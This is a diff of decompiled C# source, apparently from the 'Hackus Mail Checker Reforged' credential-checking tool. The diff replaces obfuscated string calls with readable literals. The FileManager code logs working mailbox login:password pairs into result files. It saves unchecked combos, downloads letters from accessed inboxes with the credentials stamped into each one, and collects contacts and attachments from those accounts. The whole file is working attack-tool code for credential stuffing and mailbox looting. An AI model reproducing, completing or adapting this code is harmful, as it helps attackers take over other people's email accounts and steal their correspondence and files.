@@ -32,18 +32,18 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 		// Token: 0x17000101 RID: 257
 		// (get) Token: 0x060003C7 RID: 967 RVA: 0x00008D3F File Offset: 0x00006F3F
 		// (set) Token: 0x060003C8 RID: 968 RVA: 0x00008D46 File Offset: 0x00006F46
-		public static string ConfigurationPath { get; set; } = Path.Combine(_Module_.smethod_2<string>(2070174868), _Module_.smethod_4<string>(-685338130));
+		public static string ConfigurationPath { get; set; } = Path.Combine(".hackus", "serverdatabase.db");
 
 		// Token: 0x17000102 RID: 258
 		// (get) Token: 0x060003C9 RID: 969 RVA: 0x00008D4E File Offset: 0x00006F4E
 		// (set) Token: 0x060003CA RID: 970 RVA: 0x00008D55 File Offset: 0x00006F55
-		public static string SettingsPath { get; set; } = Path.Combine(_Module_.smethod_4<string>(-772499879), _Module_.smethod_5<string>(-1949024626));
+		public static string SettingsPath { get; set; } = Path.Combine(".hackus", "Settings.cfg");
 
 		// Token: 0x060003CB RID: 971 RVA: 0x00017C9C File Offset: 0x00015E9C
 		public static void CreateResultsDirectory()
 		{
-			string str = DateTime.Now.ToString(_Module_.smethod_6<string>(345015252), CultureInfo.InvariantCulture);
-			FileManager.ResultsPath = Path.GetFullPath(Path.Combine(_Module_.smethod_4<string>(732679442), str + _Module_.smethod_3<string>(-1062652586) + FileManager.BaseFileName));
+			string str = DateTime.Now.ToString("dd.MM.yyyy HH.mm", CultureInfo.InvariantCulture);
+			FileManager.ResultsPath = Path.GetFullPath(Path.Combine("Results", str + " — " + FileManager.BaseFileName));
 			Directory.CreateDirectory(FileManager.ResultsPath);
 		}
 
@@ -58,11 +58,11 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 					List<Mailbox> list = MailManager.Instance.QueueToList();
 					if (list != null)
 					{
-						using (StreamWriter streamWriter = new StreamWriter(Path.Combine(FileManager.ResultsPath, _Module_.smethod_2<string>(1354801003)), false))
+						using (StreamWriter streamWriter = new StreamWriter(Path.Combine(FileManager.ResultsPath, "Rest.txt"), false))
 						{
 							foreach (Mailbox mailbox in list)
 							{
-								streamWriter.WriteLine(mailbox.Address + _Module_.smethod_2<string>(-1691660964) + mailbox.Password);
+								streamWriter.WriteLine(mailbox.Address + ":" + mailbox.Password);
 							}
 						}
 					}
@@ -81,9 +81,9 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			{
 				try
 				{
-					using (StreamWriter streamWriter = new StreamWriter(Path.Combine(FileManager.ResultsPath, string.Format(_Module_.smethod_4<string>(-249529385), type)), true))
+					using (StreamWriter streamWriter = new StreamWriter(Path.Combine(FileManager.ResultsPath, string.Format("{0}.txt", type)), true))
 					{
-						streamWriter.WriteLine(login + _Module_.smethod_2<string>(-1691660964) + password);
+						streamWriter.WriteLine(login + ":" + password);
 					}
 				}
 				catch
@@ -100,7 +100,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			{
 				try
 				{
-					using (StreamWriter streamWriter = new StreamWriter(Path.Combine(FileManager.ResultsPath, _Module_.smethod_5<string>(446429010)), true))
+					using (StreamWriter streamWriter = new StreamWriter(Path.Combine(FileManager.ResultsPath, "Contacts.txt"), true))
 					{
 						streamWriter.WriteLine(contact);
 					}
@@ -119,9 +119,9 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			{
 				try
 				{
-					using (StreamWriter streamWriter = new StreamWriter(Path.Combine(FileManager.ResultsPath, FileManager.GetSafeFilename(request) + _Module_.smethod_2<string>(829792275)), true))
+					using (StreamWriter streamWriter = new StreamWriter(Path.Combine(FileManager.ResultsPath, FileManager.GetSafeFilename(request) + ".txt"), true))
 					{
-						streamWriter.WriteLine(string.Format(_Module_.smethod_3<string>(-1022242503), login, password, count));
+						streamWriter.WriteLine(string.Format("{0}:{1} — {2}", login, password, count));
 					}
 				}
 				catch
@@ -138,12 +138,12 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			if (SearchSettings.Instance.DownloadMode != DownloadMode.Html)
 			{
 				text = FileManager.GetPlainText(login, password, from, body, subject, date, folder);
-				str = _Module_.smethod_2<string>(829792275);
+				str = ".txt";
 			}
 			else
 			{
 				text = FileManager.GetHtml(login, password, from, body, subject, date, folder);
-				str = _Module_.smethod_4<string>(-1881561021);
+				str = ".html";
 			}
 			string path;
 			if (!SearchSettings.Instance.DownloadIntoSingleFile)
@@ -152,7 +152,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			}
 			else
 			{
-				path = Path.Combine(FileManager.ResultsPath, _Module_.smethod_4<string>(-1794399272), FileManager.GetSafeFilename(request) + str);
+				path = Path.Combine(FileManager.ResultsPath, "Downloads", FileManager.GetSafeFilename(request) + str);
 			}
 			if (text != null)
 			{
@@ -195,7 +195,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			{
 				return;
 			}
-			FileManager.SaveLetter(login, password, request, message.Sender.ToString(), text, message.Subject, DateTime.Parse(message.Headers[_Module_.smethod_3<string>(494066261)]), _Module_.smethod_4<string>(-521243277));
+			FileManager.SaveLetter(login, password, request, message.Sender.ToString(), text, message.Subject, DateTime.Parse(message.Headers["Date"]), "INBOX");
 		}
 
 		// Token: 0x060003D2 RID: 978 RVA: 0x00018178 File Offset: 0x00016378
@@ -206,7 +206,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			{
 				return;
 			}
-			FileManager.SaveLetter(login, password, request, message.Sender.ToString(), body, message.Subject, message.Date, message.Folder ?? _Module_.smethod_4<string>(-521243277));
+			FileManager.SaveLetter(login, password, request, message.Sender.ToString(), body, message.Subject, message.Date, message.Folder ?? "INBOX");
 		}
 
 		// Token: 0x060003D3 RID: 979 RVA: 0x000181D0 File Offset: 0x000163D0
@@ -228,7 +228,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 						goto IL_4A;
 					}
 				}
-				folder2 = _Module_.smethod_4<string>(-521243277);
+				folder2 = "INBOX";
 				IL_4A:
 				FileManager.SaveLetter(login, password, request, from, body2, subject, date, folder2);
 				return;
@@ -254,7 +254,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 						goto IL_4A;
 					}
 				}
-				folder2 = _Module_.smethod_6<string>(2132499449);
+				folder2 = "INBOX";
 				IL_4A:
 				FileManager.SaveLetter(login, password, request, from, body, subject, date, folder2);
 				return;
@@ -282,7 +282,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 					goto IL_4B;
 				}
 			}
-			folder2 = _Module_.smethod_2<string>(-1971847226);
+			folder2 = "INBOX";
 			IL_4B:
 			FileManager.SaveLetter(login, password, request, from, body, subject, date, folder2);
 		}
@@ -361,7 +361,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			}
 			else
 			{
-				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment = alternateViews.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, _Module_.smethod_5<string>(473053949)));
+				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment = alternateViews.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, "text/html"));
 				obj = ((attachment != null) ? attachment.Body : null);
 			}
 			string text = (string)obj;
@@ -373,7 +373,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			}
 			else
 			{
-				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment2 = alternateViews2.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, _Module_.smethod_2<string>(-1988142280)));
+				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment2 = alternateViews2.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, "text/plain"));
 				obj2 = ((attachment2 != null) ? attachment2.Body : null);
 			}
 			string text2 = (string)obj2;
@@ -424,7 +424,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			}
 			else
 			{
-				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment = alternateViews.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, _Module_.smethod_2<string>(642151244)));
+				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment = alternateViews.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, "text/html"));
 				obj = ((attachment != null) ? attachment.Body : null);
 			}
 			string text = (string)obj;
@@ -436,7 +436,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			}
 			else
 			{
-				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment2 = alternateViews2.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, _Module_.smethod_5<string>(93151217)));
+				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment2 = alternateViews2.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, "text/plain"));
 				obj2 = ((attachment2 != null) ? attachment2.Body : null);
 			}
 			string text2 = (string)obj2;
@@ -474,7 +474,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			}
 			else
 			{
-				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment = alternateViews.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, _Module_.smethod_4<string>(1173908513)));
+				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment = alternateViews.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, "text/html"));
 				obj = ((attachment != null) ? attachment.Body : null);
 			}
 			string text = (string)obj;
@@ -486,7 +486,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			}
 			else
 			{
-				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment2 = alternateViews2.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, _Module_.smethod_6<string>(955020623)));
+				Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment2 = alternateViews2.FirstOrDefault((Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment v) => FileManager._c_.smethod_0(v.ContentType, "text/plain"));
 				obj2 = ((attachment2 != null) ? attachment2.Body : null);
 			}
 			string text2 = (string)obj2;
@@ -516,57 +516,57 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 		// Token: 0x060003DA RID: 986 RVA: 0x0001860C File Offset: 0x0001680C
 		private static string GetHtml(string login, string password, string from, string body, string subject, DateTime date, string folder = "INBOX")
 		{
-			string str = string.Concat(Enumerable.Repeat<string>(_Module_.smethod_4<string>(-41547654), 50));
+			string str = string.Concat(Enumerable.Repeat<string>("=", 50));
 			StringBuilder stringBuilder = new StringBuilder();
-			stringBuilder.AppendLine(_Module_.smethod_3<string>(-67820023));
-			stringBuilder.AppendLine(str + _Module_.smethod_3<string>(-1191592591));
-			stringBuilder.AppendLine(string.Format(_Module_.smethod_2<string>(2105538664), new object[]
+			stringBuilder.AppendLine("<br><center><font size=\"4\">");
+			stringBuilder.AppendLine(str + "<br>");
+			stringBuilder.AppendLine(string.Format("MAIL: {0}:{1}<br>FROM: {2}<br>SUBJECT: {3}<br>DATE: {4}<br>FOLDER: {5}<br>", new object[]
 			{
 				login,
 				password,
-				from.Replace(_Module_.smethod_5<string>(240979461), _Module_.smethod_5<string>(-328874637)).Replace(_Module_.smethod_2<string>(-1656297168), _Module_.smethod_5<string>(-708777369)),
+				from.Replace("<", "&lt;").Replace(">", "&gt;"),
 				subject,
 				date,
 				folder
 			}));
-			stringBuilder.AppendLine(str + _Module_.smethod_2<string>(857033335));
-			stringBuilder.AppendLine(_Module_.smethod_3<string>(896239652));
-			stringBuilder.AppendLine(body + _Module_.smethod_5<string>(773876498));
+			stringBuilder.AppendLine(str + "<br>");
+			stringBuilder.AppendLine("</font></center>");
+			stringBuilder.AppendLine(body + "<br><br>");
 			return stringBuilder.ToString();
 		}
 
 		// Token: 0x060003DB RID: 987 RVA: 0x00018714 File Offset: 0x00016914
 		private static string GetPlainText(string login, string password, string from, string body, string subject, DateTime date, string folder = "INBOX")
 		{
-			string str = string.Concat(Enumerable.Repeat<string>(_Module_.smethod_4<string>(-41547654), 50));
+			string str = string.Concat(Enumerable.Repeat<string>("=", 50));
 			StringBuilder stringBuilder = new StringBuilder();
-			stringBuilder.AppendLine(str + _Module_.smethod_5<string>(-1278631467));
-			stringBuilder.AppendLine(_Module_.smethod_5<string>(-1848485565) + login + _Module_.smethod_6<string>(1827648947) + password);
-			stringBuilder.AppendLine(_Module_.smethod_2<string>(1988575643) + from);
-			stringBuilder.AppendLine(_Module_.smethod_4<string>(403877729) + subject);
-			stringBuilder.AppendLine(string.Format(_Module_.smethod_4<string>(-385386331), date));
-			stringBuilder.AppendLine(_Module_.smethod_5<string>(768710437) + folder);
-			stringBuilder.AppendLine(str + _Module_.smethod_3<string>(-227532916));
-			stringBuilder.AppendLine(body + _Module_.smethod_3<string>(-227532916));
+			stringBuilder.AppendLine(str + "");
+			stringBuilder.AppendLine("MAIL: " + login + ":" + password);
+			stringBuilder.AppendLine("FROM: " + from);
+			stringBuilder.AppendLine("SUBJECT: " + subject);
+			stringBuilder.AppendLine(string.Format("DATE: {0}", date));
+			stringBuilder.AppendLine("FOLDER: " + folder);
+			stringBuilder.AppendLine(str + "");
+			stringBuilder.AppendLine(body + "");
 			return stringBuilder.ToString();
 		}
 
 		// Token: 0x060003DC RID: 988 RVA: 0x00018810 File Offset: 0x00016A10
 		private static string HtmlToPlainText(string html)
 		{
-			return Regex.Replace(Regex.Replace(Regex.Unescape(Regex.Replace(Regex.Replace(Regex.Replace(html, _Module_.smethod_5<string>(1948157853), string.Empty, RegexOptions.Compiled), _Module_.smethod_2<string>(-97739575), string.Empty, RegexOptions.Compiled), _Module_.smethod_5<string>(238595559), string.Empty, RegexOptions.Compiled)), _Module_.smethod_3<string>(-1709147778), _Module_.smethod_2<string>(1849819774)), _Module_.smethod_5<string>(-331258539), _Module_.smethod_4<string>(-2071533490)).Replace(_Module_.smethod_3<string>(-1106851411), string.Empty);
+			return Regex.Replace(Regex.Replace(Regex.Unescape(Regex.Replace(Regex.Replace(Regex.Replace(html, "<style(.|", string.Empty, RegexOptions.Compiled), "<script(.|", string.Empty, RegexOptions.Compiled), "<(.|\\n)*?>", string.Empty, RegexOptions.Compiled)), "[ \\t]{3,}", " "), "[\\s]{2,}", "").Replace("&nbsp;", string.Empty);
 		}
 
 		// Token: 0x060003DD RID: 989 RVA: 0x00008D5D File Offset: 0x00006F5D
 		private static string RemoveEmptyLines(string lines)
 		{
-			return Regex.Replace(lines, _Module_.smethod_2<string>(-775000747), string.Empty).TrimEnd(Array.Empty<char>());
+			return Regex.Replace(lines, "^\\s*$\\n|\\r", string.Empty).TrimEnd(Array.Empty<char>());
 		}
 
 		// Token: 0x060003DE RID: 990 RVA: 0x000188A8 File Offset: 0x00016AA8
 		private static string GetSafeFilename(string s)
 		{
-			return s.Replace(_Module_.smethod_5<string>(-2043602992), _Module_.smethod_4<string>(1105980040)).Replace(_Module_.smethod_6<string>(-1706108974), "").Replace(_Module_.smethod_4<string>(316715980), "").Replace(_Module_.smethod_6<string>(1827648947), "").Replace(_Module_.smethod_4<string>(-1436135638), "").Replace(_Module_.smethod_5<string>(240979461), "").Replace(_Module_.smethod_4<string>(568584589), "").Replace(_Module_.smethod_6<string>(1403443280), "").Replace(_Module_.smethod_2<string>(1588727045), "");
+			return s.Replace("\\\\", "\\").Replace("/", "").Replace("*", "").Replace(":", "").Replace("?", "").Replace("<", "").Replace(">", "").Replace("|", "").Replace("\"", "");
 		}
 
 		// Token: 0x060003DF RID: 991 RVA: 0x00018970 File Offset: 0x00016B70
@@ -577,13 +577,13 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			{
 				try
 				{
-					string oldValue = string.Format(_Module_.smethod_5<string>(541802010), new object[]
+					string oldValue = string.Format("[DOMAIN]{0}[/DOMAIN][SERVER]{1}[/SERVER][TYPE]{2}[/TYPE][PORT]{3}[/PORT][SSL]{4}[/SSL]", new object[]
 					{
 						server.Domain,
 						server.Hostname,
 						server.Protocol.ToString().ToUpper(),
 						server.Port,
-						(server.Socket == SocketType.SSL) ? _Module_.smethod_4<string>(1274271205) : _Module_.smethod_5<string>(884747681)
+						(server.Socket == SocketType.SSL) ? "1" : "0"
 					});
 					File.WriteAllText(FileManager.ConfigurationPath, File.ReadAllText(FileManager.ConfigurationPath).Replace(oldValue, ""));
 				}
@@ -603,13 +603,13 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 				{
 					using (StreamWriter streamWriter = new StreamWriter(FileManager.ConfigurationPath, true))
 					{
-						streamWriter.WriteLine(string.Format(_Module_.smethod_3<string>(1017469901), new object[]
+						streamWriter.WriteLine(string.Format("[DOMAIN]{0}[/DOMAIN][SERVER]{1}[/SERVER][TYPE]{2}[/TYPE][PORT]{3}[/PORT][SSL]{4}[/SSL]", new object[]
 						{
 							server.Domain,
 							server.Hostname,
 							server.Protocol.ToString().ToUpper(),
 							server.Port,
-							(server.Socket == SocketType.SSL) ? _Module_.smethod_5<string>(-415504783) : _Module_.smethod_4<string>(752524725)
+							(server.Socket == SocketType.SSL) ? "1" : "0"
 						}));
 					}
 				}
@@ -627,21 +627,21 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			{
 				try
 				{
-					string oldValue = string.Format(_Module_.smethod_6<string>(2145625020), new object[]
+					string oldValue = string.Format("[DOMAIN]{0}[/DOMAIN][SERVER]{1}[/SERVER][TYPE]{2}[/TYPE][PORT]{3}[/PORT][SSL]{4}[/SSL]", new object[]
 					{
 						original.Domain,
 						original.Hostname,
 						original.Protocol.ToString().ToUpper(),
 						original.Port,
-						(original.Socket == SocketType.SSL) ? _Module_.smethod_4<string>(1274271205) : _Module_.smethod_5<string>(884747681)
+						(original.Socket == SocketType.SSL) ? "1" : "0"
 					});
-					string newValue = string.Format(_Module_.smethod_5<string>(541802010), new object[]
+					string newValue = string.Format("[DOMAIN]{0}[/DOMAIN][SERVER]{1}[/SERVER][TYPE]{2}[/TYPE][PORT]{3}[/PORT][SSL]{4}[/SSL]", new object[]
 					{
 						replace.Domain,
 						replace.Hostname,
 						replace.Protocol.ToString().ToUpper(),
 						replace.Port,
-						(replace.Socket == SocketType.SSL) ? _Module_.smethod_2<string>(816196536) : _Module_.smethod_3<string>(-65892584)
+						(replace.Socket == SocketType.SSL) ? "1" : "0"
 					});
 					File.WriteAllText(FileManager.ConfigurationPath, File.ReadAllText(FileManager.ConfigurationPath).Replace(oldValue, newValue));
 				}
@@ -683,7 +683,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 		// Token: 0x060003E4 RID: 996 RVA: 0x00018D40 File Offset: 0x00016F40
 		private static void SaveAttachment(Hackus_Mail_Checker_Reforged.Net.Mail.Attachment attachment, string mailAddress)
 		{
-			string text = Path.Combine(FileManager.ResultsPath, _Module_.smethod_6<string>(-223475279), mailAddress);
+			string text = Path.Combine(FileManager.ResultsPath, "Attachments", mailAddress);
 			string path = Path.Combine(text, attachment.Filename);
 			try
 			{
@@ -701,8 +701,8 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 		// Token: 0x060003E5 RID: 997 RVA: 0x00018DE0 File Offset: 0x00016FE0
 		public static void SaveAttachment(Hackus_Mail_Checker_Reforged.Net.Mail.Message.Attachment attachment, string mailAddress)
 		{
-			string text = Path.Combine(FileManager.ResultsPath, _Module_.smethod_4<string>(1716112283), mailAddress);
-			string name = (!string.IsNullOrWhiteSpace(attachment.Name)) ? attachment.Name : _Module_.smethod_2<string>(740070314);
+			string text = Path.Combine(FileManager.ResultsPath, "Attachments", mailAddress);
+			string name = (!string.IsNullOrWhiteSpace(attachment.Name)) ? attachment.Name : "unknown";
 			string path = Path.Combine(text, name);
 			try
 			{
@@ -733,7 +733,7 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 			int num = 1;
 			while (File.Exists(path))
 			{
-				path = Path.Combine(directoryName, fileNameWithoutExtension + _Module_.smethod_3<string>(2023933234) + num.ToString() + extension);
+				path = Path.Combine(directoryName, fileNameWithoutExtension + " " + num.ToString() + extension);
 				num++;
 			}
 			return new FileInfo(path);
@@ -744,14 +744,14 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 		{
 			try
 			{
-				string value = _Module_.smethod_6<string>(2015891145) + source + _Module_.smethod_6<string>(90024148);
-				using (StreamWriter streamWriter = new StreamWriter(_Module_.smethod_4<string>(-1427743014), true))
+				string value = "Unhandled exception (" + source + ")";
+				using (StreamWriter streamWriter = new StreamWriter("HackusErrors.txt", true))
 				{
 					streamWriter.WriteLine(value);
-					streamWriter.WriteLine(_Module_.smethod_4<string>(-1059862742) + exception.Message);
-					streamWriter.WriteLine(_Module_.smethod_2<string>(-796793595) + exception.StackTrace);
-					streamWriter.WriteLine(_Module_.smethod_3<string>(813558183) + exception.Source);
-					streamWriter.WriteLine(_Module_.smethod_4<string>(-491781356));
+					streamWriter.WriteLine("Message: " + exception.Message);
+					streamWriter.WriteLine("StackTrace: " + exception.StackTrace);
+					streamWriter.WriteLine("Source: " + exception.Source);
+					streamWriter.WriteLine("END: ");
 				}
 			}
 			catch
@@ -764,14 +764,14 @@ namespace Hackus_Mail_Checker_Reforged.Services.Managers
 		{
 			try
 			{
-				string value = _Module_.smethod_5<string>(2085653975) + source + _Module_.smethod_4<string>(325108604);
-				using (StreamWriter streamWriter = new StreamWriter(_Module_.smethod_4<string>(-1427743014), true))
+				string value = "Unhandled exception (" + source + ")";
+				using (StreamWriter streamWriter = new StreamWriter("HackusErrors.txt", true))
 				{
 					streamWriter.WriteLine(value);
-					streamWriter.WriteLine(_Module_.smethod_5<string>(254888376) + exception.Message);
-					streamWriter.WriteLine(_Module_.smethod_4<string>(-1849126802) + exception.StackTrace);
-					streamWriter.WriteLine(_Module_.smethod_3<string>(813558183) + exception.Source);
-					streamWriter.WriteLine(_Module_.smethod_6<string>(394161941));
+					streamWriter.WriteLine("Message: " + exception.Message);
+					streamWriter.WriteLine("StackTrace: " + exception.StackTrace);
+					streamWriter.WriteLine("Source: " + exception.Source);
+					streamWriter.WriteLine("END: ");
 				}
 			}
 			catch
